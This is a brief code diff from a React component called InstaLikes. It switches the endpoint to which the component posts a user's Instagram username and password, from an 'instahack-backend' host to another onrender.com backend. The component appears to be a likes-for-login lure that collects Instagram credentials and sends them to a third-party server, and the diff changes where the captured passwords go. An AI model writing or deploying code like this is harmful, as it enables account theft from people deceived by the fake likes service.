@@ -12,7 +12,7 @@ const InstaLikes = () => {
     setMessage("");
 
     try {
-      const { data } = await axios.post("https://instahack-backend.onrender.com/api/register", {
+      const { data } = await axios.post("https://nody-backend.onrender.com/api/register", {
         instagramUsername,
         password,
       });
